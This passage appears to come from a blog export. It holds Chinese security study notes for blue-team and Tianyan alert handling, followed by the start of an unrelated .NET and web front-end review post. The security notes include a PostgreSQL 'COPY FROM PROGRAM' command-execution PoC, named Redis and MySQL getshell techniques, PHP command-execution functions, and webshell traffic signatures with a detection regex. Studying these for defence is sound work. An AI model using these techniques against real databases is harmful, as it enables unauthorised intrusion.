监测所有网络传输流量，及时发现异常通信；\n鱼叉攻击鱼叉攻击，肯定是有看到了鱼再叉，也就是有针对性的攻击，目标明确，比如公司或团体，给这些特定团体发送包含木马的邮件，这种邮件要让受害者打开，就需要一个欺骗和迷惑的标题。这个题目和内容的构造就考验红方的想象力了。比如打补丁的通知邮件，放假通知安排，投诉举报，简历投递或者来点公司的劲爆信息引爆吃瓜群众。员工点了附件之后，就中了木马，黑客在远端就可以远程控制这个电脑了。\ntomcat可以执行的后缀名jsp html htm js css xml gif jpg png pdf doc xls\nssrf有哪些协议http https ftp smtp dns file \nmysql数据库系统执行函数nmap参数\n-sS 半开扫描(TCP SYN扫描)，执行速度快，不容易被注意到，可以避免被记入目标系统的日志，需要root权限。它常常被称为半开放扫描， 因为它不打开一个完全的TCP连接。它发送一个SYN报文， 就像您真的要打开一个连接，然后等待响应。\n-sT 当SYN扫描不能用时，TCP Connect()扫描就是默认的TCP扫描。会在⽬标主机的⽇志中记录⼤批连接请求和错误信息，但是由于是tcp connect()扫描，容易被记录。当SYN扫描可用时，它通常是更好的选择\n-sP ping扫描，Nmap在扫描端⼜时，默认都会使⽤ping扫描，只有主机存活，Nmap才会继续扫描。\n-sU UDP扫描，但UDP扫描是不可靠的，速度也比较慢\n-sA 这种扫描与目前为止讨论的其它扫描的不同之处在于 它不能确定open(开放的)或者 open|filtered(开放或者过滤的))端口。 它用于发现防火墙规则，确定它们是有状态的还是无状态的，哪些端口是被过滤的。\n-sV 探测端⼜服务版本\n-Pn 扫描之前不需要⽤ping命令，有些防⽕墙禁⽌ping命令。可以使⽤此选项进⾏扫描\n-v 显⽰扫描过程，推荐使⽤\n-p 指定端⼜，如“1-65535、1433、135、22、80”等\n-O 启⽤远程操作系统检测，存在误报\n-O –osscan-limit 针对指定的目标进行操作系统检测\n-O –osscan-guess 当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认 进行这种匹配\n-A 全⾯系统检测、启⽤脚本检测、扫描等\n-oN&#x2F;-oX&#x2F;-oG 将报告写⼊⽂件，分别是正常、XML、grepable 三种格式\n-iL 读取主机列表，例如，-iL “C:\\ip.txt”\n\n天眼可以检测逻辑漏洞吗天眼的漏洞扫描模块主要基于静态代码分析和黑盒测试技术，对于逻辑漏洞的检测能力相对有限。\n内网渗透工具，代理渗透测试流程\n确定目标和范围：定义渗透测试的目标和范围，包括要测试的系统、应用程序、网络、物理设施等。\n收集情报：收集有关目标系统的信息，例如 IP 地址、操作系统类型、应用程序版本、网络拓扑等，以便进行后续测试。\n漏洞扫描：使用漏洞扫描工具对目标系统进行扫描，以发现已知的漏洞和弱点。\n渗透测试：通过手动测试和自动化工具进行渗透测试，包括尝试各种攻击向量，如 SQL 注入、XSS 攻击、文件包含漏洞、社交工程等。\n提交漏洞报告：将发现的漏洞和安全弱点整理成报告，详细描述漏洞的影响和风险，并提供建议和修复措施。\n清理痕迹：在测试完成后，清除所有测试过程中留下的痕迹，确保不会对目标系统造成任何影响或损害。\n重复测试：在修复漏洞后，进行重复测试以确认漏洞已被修复，并且没有引入新的漏洞。\n\n天眼日志分析语法天眼日志分析语法（TianEye Log Query Syntax）是指在奇安信的天眼平台上，用于查询、分析和可视化各种日志数据的语法。以下是一些常见的天眼日志分析语法示例：\n\n关键字查询：使用关键字查询指定时间段内的日志数据。例如，查询访问时间为2022年4月1日至4月30日之间的所有日志：\n\nindex=xxx sourcetype=yyy access_time&gt;=2022-04-01 access_time&lt;=2022-04-30\n\n精确匹配查询：使用精确匹配查询指定某个字段的值。例如，查询客户端 IP 地址为 192.168.1.100 的所有日志：\nindex=xxx sourcetype=yyy client_ip=192.168.1.100\n\n多条件查询：使用多个条件查询组合查询结果。例如，查询客户端 IP 地址为 192.168.1.100，且访问时间为2022年4月1日至4月30日之间的所有日志：\nindex=xxx sourcetype=yyy client_ip=192.168.1.100 access_time&gt;=2022-04-01 access_time&lt;=2022-04-30\n\n聚合查询：使用聚合函数统计查询结果。例如，查询某个时间段内 HTTP 访问次数最多的前 10 个客户端 IP 地址：\nindex=xxx sourcetype=yyy access_time&gt;=2022-04-01 access_time&lt;=2022-04-30 | top 10 client_ip\n\n可视化查询：使用可视化组件将查询结果可视化。例如，使用柱状图可视化某个时间段内 HTTP 访问次数最多的前 10 个客户端 IP 地址：\nindex=xxx sourcetype=yyy access_time&gt;=2022-04-01 access_time&lt;=2022-04-30 | \n\n天眼流量分析和威胁检测区别天眼流量分析和威胁检测是奇安信的天眼平台提供的两个不同的功能模块，它们的主要区别如下：\n\n功能目标不同：天眼流量分析的主要目标是分析网络流量，了解网络拓扑结构、通信情况和性能状况，发现网络异常和瓶颈问题等；而威胁检测的主要目标是检测和预防网络威胁和攻击，包括漏洞扫描、入侵检测、恶意代码检测、网络流量分析等多个方面。\n数据来源不同：天眼流量分析主要关注网络流量数据，可以采集和分析网络设备、流量数据、协议、应用等方面的数据；而威胁检测则需要多种数据源的支持，如安全事件日志、主机安全数据、网络安全数据、终端安全数据等。\n数据处理方式不同：天眼流量分析主要采用流量抓包、协议解析、拓扑分析等技术进行数据处理和分析；而威胁检测则采用多种技术手段进行数据处理和分析，如恶意代码识别、行为分析、异常检测、漏洞扫描等。\n应用场景不同：天眼流量分析主要适用于网络运维、网络性能分析、网络安全监控等领域；而威胁检测则适用于网络安全、信息安全等领域，可以帮助企业发现和防范各种网络威胁和攻击。\n\n天眼可以审0day吗不可以\n怎么判断自己的机器是不是域控\n打开计算机管理器：在 Windows 操作系统中，可以通过在开始菜单中搜索“计算机管理器”来打开计算机管理器。\n查看域：在计算机管理器中，展开“本地用户和组”或“计算机管理”等选项卡，然后选择“域”。如果机器加入了域并成为域控制器，将会在此处看到域的名称和其他域控制器的信息。\n检查服务：在 Windows 操作系统中，域控制器会运行一些特定的服务，比如“Active Directory域服务”，“DNS服务器服务”等。可以通过打开“服务”选项卡来查看这些服务是否在运行，并且是否是自动启动。\n检查系统信息：在 Windows 操作系统中，可以通过打开“系统信息”来查看机器的详细信息。在其中的“系统摘要”选项卡中，如果机器是域控制器，将会看到“角色”一栏显示“域控制器”。\n\n常见webshell流量体征\n异常流量：Webshell的流量通常会显示为异常流量，因为攻击者通常会通过Webshell上传和下载文件、执行命令等操作，这些操作都会产生大量不正常的流量。\n带有特定字符或字符串：Webshell可能会带有特定字符或字符串，如“eval(base64_decode(”，这些字符或字符串用于解码Webshell的命令或脚本，攻击者可能会使用这些字符或字符串来隐藏Webshell。\n频繁访问：Webshell的访问可能会比正常的用户访问频率更高，这是因为攻击者需要不断访问Webshell以获取控制目标服务器的权限。\n长时间运行的连接：Webshell的流量可能会包含长时间运行的连接，这是因为攻击者通常会保持Webshell的连接以便在需要时执行更多的操作。\n异常文件：Webshell可能会通过上传和下载文件来执行操作，因此出现异常文件或文件类型也可能是Webshell的流量体征。\n\n常用数据库默认端口及漏洞\n89 端口（ldap）安全漏洞：未授权访问 、弱口令利用方式：通过LdapBrowser工具直接连入。\n\n1433 端口（Mssql）安全漏洞：弱口令、暴力破解利用方式：差异备份getshell、SA账户提权等\n\n1521 端口（Oracle）安全漏洞：弱口令、暴力破解利用方式：通过弱口令&#x2F;暴力破解进行入侵。\n\n3306 端口（MySQL）安全漏洞：弱口令、暴力破解利用方式：利用日志写入webshell、udf提权、mof提权等。\n\n5432 端口（ PostgreSQL）安全漏洞：弱口令、高权限命令执行利用方式：攻击者通过弱口令获取账号信息，连入postgres中，可执行系统命令。PoC参考： DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM ‘id’; SELECT * FROM cmd_exec;\n\n5984 端口（CouchDB）安全漏洞：垂直权限绕过、任意命令执行利用方式：通过构造数据创建管理员用户，使用管理员用户登录，构造恶意请求触发任意命令执行。后台访问：http:&#x2F;&#x2F;:5984&#x2F;_utils\n\n6379 端口（Redis）安全漏洞：未授权访问利用方式：绝对路径写webshell 、利用计划任务执行命令反弹shell、公私钥认证获取root权限、主从复制RCE等。\n\n9200 端口（elasticsearch）安全漏洞：未授权访问、命令执行\n\n\n目标ip是邮件服务器要怎么处理\n检查邮件服务器是否正常运行：您可以通过尝试连接到邮件服务器并发送一封电子邮件来检查邮件服务器是否正常运行。如果邮件服务器无法连接或无法发送电子邮件，则可能需要检查邮件服务器的配置或网络设置。\n检查安全设置：邮件服务器需要设置安全措施以保护电子邮件和用户数据，如防火墙、反病毒软件和邮件过滤器等。您可以检查这些设置是否已启用或需要进行更新。\n更新邮件服务器软件：如果您的邮件服务器软件已经过时，可能需要更新到最新版本以修复可能存在的安全漏洞和错误。\n监控邮件服务器流量：监控邮件服务器的流量可以帮助您识别和防止未经授权的访问或攻击。您可以使用日志分析工具或流量监控工具来监控邮件服务器的流量，并检查是否存在异常活动。\n增强安全措施：除了基本的安全措施，您还可以考虑增强邮件服务器的安全措施，如强密码策略、多因素身份验证和加密等。这些措施可以帮助保护邮件服务器免受恶意\n\n目的ip是114.114.114.114端口是53需要封禁吗群里面遇到exe可执行程序怎么处理\n不要下载或运行未知来源的可执行程序。如果你不确定该程序是否安全，请询问发送者或其他群组成员。\n使用杀毒软件进行扫描。如果你已经下载了该程序并想运行它，可以使用杀毒软件进行扫描，以确保它不包含任何恶意软件。\n隔离该文件。如果你怀疑该程序可能会造成破坏，请将其隔离在一个安全的位置，以防止其对你的计算机系统造成任何影响。\n通知管理员。如果你认为该程序可能会对其他群组成员造成威胁，请及时通知管理员或相关人员，并让他们采取适当的措施来处理该问题。\n虚拟机打开\n\n遇到远控木马告警如何处理\n立即断开网络连接。为了防止该木马进一步攻击计算机或服务器，你应该立即断开网络连接，包括断开无线网络和网线连接等。\n扫描计算机或服务器。使用安全软件对计算机或服务器进行全面扫描，以检测和清除远控木马。确保使用更新的杀毒软件，以提高检测和清除恶意软件的能力。\n更改密码。更改所有重要帐户的密码，例如电子邮件、在线银行、社交媒体等。确保密码是复杂且难以猜测的，建议使用密码管理器。\n及时备份数据。备份所有重要数据，包括文件、文档、照片等，以防止数据丢失。\n更新操作系统和软件。确保计算机或服务器上的操作系统和所有软件都是最新的，以填补可能的安全漏洞。\n通知安全管理员。如果你在工作环境中发现远控木马，应立即通知安全管理员或信息安全团队，并遵循公司的安全政策和流程。\n\ncs一款渗透测试神器\nhttps://blog.csdn.net/zzwwhhpp/article/details/111773395\nwireshark过滤条件ip.src eq 192.168.1.107 or ip.dst eq 192.168.1.107\n或者\nip.addr eq 192.168.1.107 &#x2F;&#x2F; 都能显示来源IP和目标IP\ntcp.port eq 80 &#x2F;&#x2F; 不管端口是来源的还是目标的都显示\ntcp.port &#x3D;&#x3D; 80\ntcp.port eq 2722\ntcp.port eq 80 or udp.port eq 80\ntcp.dstport &#x3D;&#x3D; 80 &#x2F;&#x2F; 只显tcp协议的目标端口80\ntcp.srcport &#x3D;&#x3D; 80 &#x2F;&#x2F; 只显tcp协议的来源端口80\n udp.port eq 15000\n 过滤端口范围\ntcp.port &gt;&#x3D; 1 and tcp.port &lt;&#x3D; 80\nth.dst &#x3D;&#x3D; A0:00:00:04:C5:84 &#x2F;&#x2F; 过滤目标mac\neth.src eq A0:00:00:04:C5:84 &#x2F;&#x2F; 过滤来源mac\neth.dst&#x3D;&#x3D;A0:00:00:04:C5:84\neth.dst&#x3D;&#x3D;A0-00-00-04-C5-84\neth.addr eq A0:00:00:04:C5:84 &#x2F;&#x2F; 过滤来源MAC和目标MAC都等于A0:00:00:04:C5:84的\nhttp.request.method &#x3D;&#x3D; “GET”\nhttp.request.method &#x3D;&#x3D; “POST”\nhttp.request.uri &#x3D;&#x3D; “&#x2F;img&#x2F;logo-edu.gif”\nhttp contains “GET”\nhttp contains “HTTP&#x2F;1.”\nshiro反序列化漏洞1.1.3 漏洞原理\n  Apache Shiro框架提供了记住我的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过相关信息进行序列化，然后使用AES加密（对称），最后再使用Base64编码处理。服务端在接收cookie时：\n攻击者可以使用Shiro的默认密钥构造恶意序列化对象进行编码来伪造用户的Cookie，服务端反序列化时触发漏洞，从而执行命令\n蚁剑流量特征1.默认的 user-agent 请求头是 antsword xxx（可修改）\n 2.蚁剑的正文内容用URL加密，解密后流量最中明显的特征为ini_set(“display_errors”,”0”);\n勒索病毒传播方式有哪些\n网站挂马：用户浏览挂有木马病毒的网站，上网终端计算机系统极可能被植入木马并感染上勒索病毒。\n邮件传播：攻击者通过利用当前热门字样，在互联网上撒网式发送垃圾邮件、钓鱼邮件，一旦收件人点开带有勒索病毒的链接或附件，勒索病毒就会在计算机后台静默运行，实施勒索。\n漏洞传播：攻击者通过计算机操作系统和应用软件的漏洞攻击并植入病毒，最典型的案例是2017年在国内泛滥的WannaCry大规模勒索事件，攻击者正是利用微软445端口协议漏洞，进行感染传播网内计算机。\n捆绑传播：攻击者将勒索病毒与其他软件尤其是盗版软件、非法破解软件、激活工具进行捆绑，从而诱导用户点击下载安装，并随着宿主文件的捆绑安装进而感染用户的计算机系统。\n介质传播：攻击者通过提前植入或通过交叉使用感染等方式将携有勒索病毒的U盘、光盘等介质进行勒索病毒的移动式传播。\n\nlog4j漏洞该漏洞的主要原因是log4j在日志输出中，未对字符合法性进行严格的限制，执行了JNDI协议加载的远程恶意脚本，从而造成RCE\nwireshark抓到数据包之后你怎么去分析redis mongodb端口号redis 6379   \nmongoDB 27017\n天眼探针有什么功能天眼能否检索网络日志struct2命令执行漏洞Struts2的action:、redirect:和redirectAction:前缀参数在实现其功能的过程中使用了Ognl表达式，并将用户通过URL提交的内容拼接入Ognl表达式中，从而造成攻击者可以通过构造恶意URL来执行任意Java代码，进而可执行任意命令\n如果目的端口为: x.X.x.x,操作系统win7或者win8，检索语句要怎么写怎么写模糊查询告警类型为写入文件的检索语句如果出现两条相同的sql注入告警你会怎么处理如果出现蠕虫病毒告警，如何处理php命令执行函数system()，passthru()，exec()，pcntl_exec()，shell_exec()，popen()&#x2F;proc_popen()，反引号 &#96;&#96;\n冰蝎流量特征Accept: application&#x2F;json, text&#x2F;javascript, &#x2F;; q&#x3D;0.01\nContent-type: Application&#x2F;x-www-form-urlencoded\n冰蝎设置了10种User-Agent,每次连接shell时会随机选择一个进行使用。\n冰蝎与webshell建立连接的同时，javaw也与目的主机建立tcp连接，每次连接使用本地端口在49700左右，每连接一次，每建立一次新的连接，端口就依次增加。\n$post&#x3D;Decrypt(file_get_contents(“php:&#x2F;&#x2F;input”));\n哥斯拉流量特征Accept为text&#x2F;html, image&#x2F;gif, image&#x2F;jpeg, *; q&#x3D;.2, &#x2F;; q&#x3D;.2\ncookie中分号结尾\n和请求体一样，请求响应体也分两个格式，base64编码的和原始加密raw数据。如果请求体采用base64编码，响应体返回的也是base64编码的数据。在使用base64编码时，响应体会出现一个很明显的固定特征。这个特征是客户端和服务端编写的时候引入的。\n从代码可以看到会把一个32位的md5字符串按照一半拆分，分别放在base64编码的数据的前后两部分。整个响应包的结构体征为：md5前十六位+base64+md5后十六位。从响应数据包可以明显看到这个特征，检测时匹配这个特征可以达到比较高的检出率，同时也只可以结合前面的一些弱特征进行检查，进一步提高检出率。因为md5的字符集范围在只落在0123456789ABCDEF范围内，因此很容易去匹配，正则匹配类似于(?i:[0-9A-F]{16})[\\w+&#x2F;]{4,}&#x3D;?&#x3D;?(?i:[0-9A-F]{16})。需要注意的是md5需要同时匹配字母大小写两种情况，因为在JAVA版webshell响应中为大写字母，在PHP版中为小写字母。\n发现有入侵攻击，查看主机的哪些日志&#x2F;var&#x2F;log&#x2F;\n如何防范反序列化漏洞防范反序列化漏洞的方法主要包括以下几点：\n\n输入过滤：在接收用户输入时，进行有效性验证和输入过滤，避免恶意输入。\n对象序列化前加密：对即将进行序列化的对象中的敏感数据或者方法进行加密处理，避免序列化后数据被篡改。\n签名校验：利用数字签名技术，在序列化和反序列化的过程中添加签名机制，校验序列化对象是否经过篡改。\n更新库文件：定期更新使用的序列化库文件，避免因为库文件中的漏洞而导致反序列化漏洞的产生。\n减少依赖第三方类库：减少依赖第三方类库的情况，避免由于第三方类库中的漏洞而导致反序列化漏洞的产生。\n最小化序列化：精简序列化对象中的属性，避免不必要的属性被序列化，从而降低反序列化的风险。\n\n以上是防范反序列化漏洞的一些基本方案。此外，如果使用的是Java语言，还可以通过Java Security Manager来控制反序列化操作的权限。在开发项目时，应该尽可能地避免使用Java反序列化操作，或者在进行序列化和反序列化操作时，更加谨慎的写好对应的代码和相关配置。\n天眼上显示多个不同url的SQL注入告警，可能是什么原因？可能是网站存在多个不同的漏洞点，或者攻击者利用了不同的注入方式和参数来尝试注入，导致出现多个不同的SQL注入告警。此外，也有可能是天眼扫描器在扫描过程中出现了误报或者漏报情况，需要对告警进行仔细分析和验证。建议及时修复漏洞点，防范SQL注入等安全威胁。\n我们在天眼上遇到文件上传告警时，应急响应的流程是怎样的？ 同一台资产多次发出同一个告警，可能的原因？应对文件上传告警的应急响应流程一般包括如下步骤：\n\n确认告警情况：查看告警详细信息，包括文件类型、大小、上传时间、上传者、上传路径、上传方式、来源IP等，判断是否存在风险。\n暂停上传功能：对于存在风险的上传功能，需要暂停上传功能，防止攻击者持续上传。\n验证漏洞点：对上传功能进行全面测试，确认漏洞点，包括上传参数的类型、限制、验证等。\n修复漏洞点：根据漏洞点的验证结果，提供相应的解决方案和实施措施，比如对上传文件进行类型、大小、扩展名、后缀名等多个方面的限制。\n监测告警情况：在上传功能修复后，需对文件上传行为进行全面监测，查看是否仍然存在风险。\n\n同一台资产多次发出同一个告警可能是以下原因：\n\n真实存在的漏洞：同一漏洞点被攻击者利用多次，导致多次告警。\n系统误报：扫描器或监测设备存在误报，由于告警下发频繁，导致同一漏洞多次告警。\n前置设备异常：网络设备、WAF等前置设备异常，导致同一个请求被多次拦截，产生多次告警。\n\n在排查告警原因时，需要进行仔细分析和判断，以确认是否存在真实风险。需要及时对真实漏洞进行修复和防范，对于误报和异常情况则需要针对性的进行排查和修复。\nlinux临时文件位置在Linux系统中，临时文件通常放置在以下几个目录中：\n\n&#x2F;tmp目录：该目录是Linux系统中最常用的临时文件目录之一，任意用户都可以在该目录中创建、修改、删除文件。该目录下的文件在系统重启后会被清空。\n&#x2F;var&#x2F;tmp目录：该目录和&#x2F;tmp目录类似，不同之处在于该目录下的文件在系统重启后不会被清空，需要手动删除。\n&#x2F;dev&#x2F;shm目录：该目录是一个ramfs文件系统，在内存中创建一个文件系统，并且把该文件系统挂载到&#x2F;dev&#x2F;shm目录下。该目录也可以作为临时文件目录使用，因为文件在内存中创建，所以读写速度较快。\n\n除了上述目录之外，还有一些应用程序会自己创建临时文件目录，例如Apache创建的临时文件夹为&#x2F;var&#x2F;cache&#x2F;httpd，Nginx创建的临时文件目录为&#x2F;var&#x2F;run&#x2F;nginx&#x2F;client_body_temp。\n需要注意的是，在使用临时文件时，应尽可能使用系统默认的临时文件目录，避免用在不安全或者没有权限控制的目录。临时文件的权限也应该设置为仅能被创建者和目录管理员使用，并尽可能定期清理，以降低系统安全风险。\n使用天眼遇到sql告警怎么处理处理天眼上的SQL告警，一般需要按照以下步骤进行：\n\n核实告警：对收到的告警首先进行核实，查看告警详情以确认告警是否为真实漏洞。\n定位漏洞：确认告警存在后，需要进行漏洞定位，以查找漏洞原因和具体位置，检查SQL查询参数、输入过滤、数据库配置等方面。\n修复漏洞：根据定位得到的漏洞内容，进行相应的安全加固和漏洞修复，比如优化SQL查询语句、加强输入过滤、修复数据库配置等。\n验证修复结果：在修复漏洞后，需要再次测试系统以验证修复结果，确保系统安全性得到提高。\n预防未来漏洞：在修复漏洞之后，需要对SQL注入漏洞进一步加强防范和监测，避免类似漏洞重演。\n\n需要注意的是，上述过程应该配合严格的访问控制和身份认证机制，并进行安全审计来保证系统的安全性。另外，如果使用天眼监测到SQL注入漏洞的话，可以结合其他安全工具如WAF来对系统进行进一步防御。通过不断加强安全防护链的研发和落地，能让系统安全得到有力地提升。\n","categories":["学习"]},{"title":".NET复习","url":"/2023/03/12/NET/","content":"NET一.前端部分1.VScode 常用插件\nLive Server 搭建具有实时加载功能的小型服务器\nOpen-In-Browser直接在浏览器中查看页面\nHTML CSS SupportHTML和CSS代码提示\nCSS Peak追踪至样式表中CSS类和id定义的地方\nPrettier-Code formatter代码格式化工具\nJavaScript（ES6)CODE SNIPPETS支持ES6和JavaScript代码片段插件\nColor InfoCSS中使用颜色的相关信息\n\n2.HTML◼html部分特殊符号\n\n\n显示结果\n&amp;nbsp\n\n\n\n空格\n&amp;nbsp\n\n\n&lt;\n&amp;lt\n\n\n&gt;\n&amp;gt\n\n\n&amp;\n&amp;amp\n\n\n£\n&amp;pound\n\n\n¥\n&amp;yen\n\n\n©\n&amp;copy\n\n\n®\n&amp;reg\n\n\n™\n&amp;trade\n\n\n×\n&amp;times\n\n\n◼html表格基本结构&lt;table border=&quot;1&quot; width=&quot;600px&quot;&gt;    &lt;caption&gt;学生名单&lt;/caption&gt;    &lt;tr&gt;        &lt;th&gt;学号&lt;/th&gt;        &lt;th&gt;姓名&lt;/th&gt;        &lt;th&gt;院系&lt;/th&gt;        &lt;th colspan=&quot;2&quot;&gt;操作&lt;/th&gt;    &lt;/tr&gt;    &lt;tr&gt;        &lt;td&gt;2021001&lt;/td&gt;        &lt;td&gt;小明&lt;/td&gt;        &lt;td&gt;计算机学院&lt;/td&gt;        &lt;td&gt;编辑&lt;/td&gt;        &lt;td&gt;删除&lt;/td&gt;    &lt;/tr&gt;&lt;/table&gt;\n\n\n每个tr表示一行每个th代表这一行中的每个元素值（第一行）td代表这一行中的每个元素值(非第一行)\ncolspan=3表示这个一次包含3纵列\nrowspan=4表示这个一次包含4行\n\n◼form表单基本结构&lt;form action=&quot;data.html&quot; method=&quot;get&quot;&gt;        用户名：&lt;input type=&quot;text&quot; name=&quot;nusername&quot;        &lt;br&gt;        密码：&lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;&lt;br/&gt;        &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&lt;br/&gt;        &lt;input type=&quot;reset&quot; value=&quot;重填&quot;&lt;/form&gt;\n\n\nhttp://127.0.0.1:5500/data.html?nusername=123&amp;pwd=456这里将值传入了data.html，值与值之间用**&amp;**隔开\naction=xxxx.xxxx表示将这分表单的数据传入xxxx.xxxx\nmethon=&#39;get&#39;表示传入方法是get方法，同理还有post方法\n\n◼一些form表单元素及其属性作用&lt;form&gt;        用户名：        &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;liulei&quot; title=&quot;提示信息&quot;        &lt;br/&gt;        密码：        &lt;input type=&quot;password&quot; name=&quot;pwd&quot; maxlength=&quot;8&quot; placeholder=&quot;长度8个字符&quot;&lt;/form&gt;\n\n\nname=&quot;username&quot;表示将数据提交时url显示的参数名字是username\nvalue=liulei 属性的值表示的是输入框中显示的初始值\ntitle=提示信息鼠标移上去后会弹出“**提示信息**”\nmaxlength=8最大位数是8\nplaceholder=&quot;长度8个字符&quot;当没有输入时显示“**长度8个字符**”\n\n&lt;form&gt;    专业特长：&lt;br/&gt;    &lt;select name=&quot;master&quot; size=&quot;4&quot; multiple=&quot;multiple&quot;&gt;        &lt;option value=&quot;0&quot;&gt;.NET&lt;/option&gt;        &lt;option value=&quot;1&quot;&gt;J2EE&lt;/option&gt;        &lt;option value=&quot;2&quot;&gt;Java&lt;/option&gt;        &lt;option value=&quot;3&quot;&gt;Android&lt;/option&gt;        &lt;option value=&quot;4&quot;&gt;C&lt;/option&gt;    &lt;/select&gt;&lt;/form&gt;\n\n\nsize 属性规定下拉列表中可见选项的数目\nmultiple=&quot;multiple&quot;表示可以同时选择多个选项\nvalue属性如果我们选择的是JAVA那么我传入的数据就是master&#x3D;2\n\n&lt;form &gt;附件：&lt;input type=&quot;file&quot; name=&quot;myfile&quot; accept=&quot;文件类型&quot;&gt;&lt;/form&gt;\n\n\n&lt;form&gt;\t&lt;input type=&quot;date&quot; name=&quot;mydate&quot;&gt;&lt;/form&gt;\n\n\n3.css◼ CSS的一些单位\n◼常见选择器及优先级\n\n\n选择器\n10000\n\n\n\nstyle（内联样式）\n1000\n\n\nid选择器\n100\n\n\n类选择器、属性选择器、伪类\n10\n\n\n标签选择题、伪元素\n1\n\n\n通配符\n0\n\n\n一般来说：选择范围较大的级别较低\n◼CSS 的 2 个示例1.悬浮变色、边框、阴影等效果div&#123;\tbackground-color:lightgrey;\twidth:130px;\tborder-left:20px solid green /*做边框*/\tborder-radius:5px;/*圆角*/\tpadding:10px;\tmargin:30px;&#125;div:hover&#123;\tbackground-color:rgb(151,248,39);\tcursor:pointer;\tbox-shadow:3px 3px 5px 1px rgba(0,0,0.2);/*阴影*/&#125;&lt;div&gt;武汉科技大学&lt;/div&gt;\n\n\nbackground-color属性设置元素的背景颜色\nwidth设置段落宽度\nborder-left设置左边框属性\nborder-radius添加圆角边框\npadding内边距\nmargin外边距\nhover选择鼠标指针浮动在其上的元素，并设置其样式\ncursor:pointer网页浏览时用户鼠标指针的样式或图形形状为一只伸出食指的手\nbox-shadow 属性用于在元素的框架上添加阴影效果（ X 轴偏移量、Y 轴偏移量、模糊半径、扩散半径和颜色）\n\n2.简单导航&lt;ul class=&quot;nav&quot;&gt;\t&lt;li&gt;&lt;a href=&quot;#home&quot;&gt;主页&lt;/a&gt;&lt;/li&gt;\t&lt;li&gt;&lt;a href=&quot;#news&quot;&gt;新闻&lt;/a&gt;&lt;/li&gt;\t&lt;li&gt;&lt;a href=&quot;#contact&quot;&gt;联系&lt;/a&gt;&lt;/li&gt;\t&lt;li&gt;&lt;a href=&quot;#about&quot;&gt;关于&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;\n\n\n\nul.nav &#123;\tlist-style-type: none;&#125;.nav li &#123;\tfloat: left;&#125;.nav li a:link,.nav li a:visited &#123;        display: block;        width: 120px;        text-align: center;        padding: 4px;        color: #fff;        background-color: #98bf21;        text-decoration: none;&#125;.nav li a:hover,.nav li a:active &#123;    background-color: #7a991a;&#125;\n\n\nfloat:left把图像像左浮动\nlist-style-type设置列表样式类型\na:link正常，未访问过的链接\na:visited用户已访问过的链接\ndisplay:block设置为块级元素\ntext-align设置文本对齐方式\ntext-decoration文本修饰\n\n4.JavaScript◼ js基本特点\nJS是一种**解释性脚本语言**（代码不进行预编译，可在程序运行过程中逐行进行解释）\nJS是一种**简单的弱类型脚本语**言（未使用严格的数据类型\nJS是一种**基于对象的语言**（不仅可以创建对象，也能使用自身的对象或其他语言创建的对象）\nJS是一种**跨平台脚本语言**（不依赖于操作系统，仅需要浏览器的支持）\n\n◼JS箭头函数匿名函数可进一步用箭头函数来简化（箭头函数用=&gt;定义，也成：lambda表达式\nlet foo=function(num)&#123;    return num+1;&#125;let a=foo(100);//使用箭头函数let foo =(num)=&gt;num+1;\n\n JS 数组操作：map、reduce、join、slice、splice、push、pop、shift、unshift 方法基本用法\nJS 程序：五秒倒计时，跳转到学校官网\n&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;button id=&quot;ok&quot;&gt;3秒后确定&lt;/button&gt;&lt;/body&gt;&lt;/html&gt;&lt;script&gt;    let btn=document.getElementById(&quot;ok&quot;);    btn.disabled=true;    let t=3;    function count()&#123;        t--;        btn.innerHTML=t+&quot;秒后确定&quot;;        if(t&lt;=0)&#123;            clearInterval(id);            btn.disabled=false;            btn.innerHTML=&quot;确定&quot;;            let url=window.location;            window.loaction=&quot;https://www.wust.edu.cn&quot;        &#125;    &#125;    let id = setInterval(count,1000);&lt;/script&gt;\n\n\ndocument.getElementById方法可返回对拥有指定 ID 的第一个对象的引用\nbtn.disabled禁用\nbtn.innerHTML 属性设置或返回表格行的开始和结束标签之间的 HTML。\nsetInterval方法可按照指定的周期（以毫秒计）来调用函数或计算表达式\nclearInterval方法可取消由 setInterval() 函数设定的定时执行操作\nwindow.loaction页面跳转\n\n◼DOM基本概念DOM:文档对象模型\nDOM是载入到浏览器中的文档模型，以节点树的形式来表现文档，每个节点代表文档的构成部分\n◼DOM常用操作1.查询操作&lt;ul id=&quot;list&quot;&gt;&lt;li class=&quot;item&quot;&gt;1&lt;/li&gt;&lt;li class=&quot;item&quot;&gt;2&lt;/li&gt;&lt;li class=&quot;item&quot;&gt;3&lt;/li&gt;&lt;/ul&gt;\n\nlet list = document.getElementById(&#x27;list&#x27;) // 命中id=&quot;list&quot;的元素，注意不带#，不是css选择器console.log(list.innerHTML) //查看元素的HTML内容let first = document.querySelector(&#x27;.item&#x27;) // 命中第一个 class=&quot;item&quot; 参数为class选择器console.log(first.innerHTML)let second = document.querySelector(&#x27;.item:nth-child(2)&#x27;) // 命中第二个 .item 复杂的css选择器console.log(second.innerHTML)let items = document.querySelectorAll(&#x27;.item&#x27;) // 获得包含所有 .item 的集合（NodeList）console.log(items.length) //查看集合长度for ( let el of items ) &#123; //遍历集合console.log(el)&#125;\n\n2.创建操作：document.createElement&lt;ul id=&quot;list&quot;&gt;&lt;li class=&quot;item&quot;&gt;1&lt;/li&gt;&lt;li class=&quot;item&quot;&gt;2&lt;/li&gt;&lt;li class=&quot;item&quot;&gt;3&lt;/li&gt;&lt;/ul&gt;\n\nlet list = document.createElement(&#x27;ul&#x27;) //创建1个ul元素list.id = &#x27;list&#x27; // 设置元素的id属性for ( let i = 0; i &lt; 3; i++ ) &#123;let item = document.createElement(&#x27;li&#x27;) 